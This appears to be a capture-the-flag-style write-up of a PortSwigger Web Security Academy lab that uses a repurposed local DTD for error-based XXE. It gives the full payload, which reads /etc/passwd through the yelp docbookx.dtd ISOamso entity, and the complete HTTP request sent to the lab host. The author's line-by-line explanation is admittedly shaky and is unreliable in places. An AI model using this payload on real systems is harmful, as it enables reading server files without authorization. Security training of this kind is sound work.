Exploiting XXE to retrieve data by repurposing a local DTD

The explanation provided in the solution and on the main XXE page are great:
https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band

I don't understand the payload super well, but I'll try to break it down:
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

This loads the yelp file (which exists). 

<!ENTITY % ISOamso '

This break the entity ISOamso, triggering an error.

<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

This loads the contents of /etc/passwd into the ISOamso error message.

<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 

And this parses/displays the error.




Full payload:
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 

Request:

POST /product/stock HTTP/1.1
Host: ac391f491f9f8e7c80c923dc0056004a.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac391f491f9f8e7c80c923dc0056004a.web-security-academy.net/product?productId=1
Content-Type: application/xml
Origin: https://ac391f491f9f8e7c80c923dc0056004a.web-security-academy.net
Content-Length: 423
Connection: close
Cookie: session=XPg4lH2Xe5geec243U9mCXqrcPB5kHLN

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>